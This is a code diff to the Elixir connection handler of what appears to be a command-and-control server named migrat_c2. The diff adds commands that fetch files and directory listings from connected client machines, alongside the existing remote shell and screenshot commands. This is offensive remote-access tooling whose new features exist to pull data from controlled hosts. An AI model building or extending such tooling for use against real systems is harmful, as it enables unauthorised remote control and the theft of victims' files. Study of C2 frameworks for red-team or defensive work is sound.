@@ -36,6 +36,20 @@ defmodule Connections.Handler do
     GenServer.cast(process, {:shell_command, m})
   end
 
+  def send_get_directory(process, path) do
+    m = %Migrat.GetDirectory{
+      path: path
+    }
+    GenServer.cast(process, {:get_directory, m})
+  end
+
+  def send_get_file(process, path) do
+    m = %Migrat.GetFile{
+      path: path
+    }
+    GenServer.cast(process, {:get_file, m})
+  end
+
   def send_take_screenshot(process) do
     m = %Migrat.TakeScreenshot{}
     GenServer.cast(process, {:take_screenshot, m})
@@ -44,6 +58,7 @@ defmodule Connections.Handler do
   defp read_loop(client, server) do
     case client |> Translator.read_message(Application.fetch_env!(:migrat_c2, :initkey)) do
       {:ok, message} ->
+        Logger.debug("read message #{inspect(message)}")
         GenServer.cast(server, message)
         read_loop(client, server)
 
@@ -86,7 +101,46 @@ defmodule Connections.Handler do
 
   def handle_cast({:shell_response, response}, state) do
     Logger.info("process  got shell_response #{response.output}")
+    MigratC2.LiveUpdate.new_shellmessage(state.ident.id, response.output)
     Registry.insert_shell_line(state.ident.id, response.output)
+    {:noreply, state}
+  end
+
+  def handle_cast({:get_file, message}, state) do
+    Logger.info("process  got get_file")
+    Translator.send_message(
+      state.socket,
+      :get_file,
+      message,
+      Application.fetch_env!(:migrat_c2, :initkey)
+    )
+    |> handle_error()
+
+    {:noreply, state}
+  end
+
+  def handle_cast({:file, response}, state) do
+    Logger.info("process  got file")
+    MigratC2.LiveUpdate.command_response(state.ident.id, :get_file, response)
+    {:noreply, state}
+  end
+
+  def handle_cast({:get_directory, message}, state) do
+    Logger.info("process  got get_directory")
+    Translator.send_message(
+      state.socket,
+      :get_directory,
+      message,
+      Application.fetch_env!(:migrat_c2, :initkey)
+    )
+    |> handle_error()
+
+    {:noreply, state}
+  end
+
+  def handle_cast({:get_directory_response, response}, state) do
+    Logger.info("process  got get_directory_response")
+    MigratC2.LiveUpdate.command_response(state.ident.id, :get_directory, response)
     {:noreply, state}
   end
 
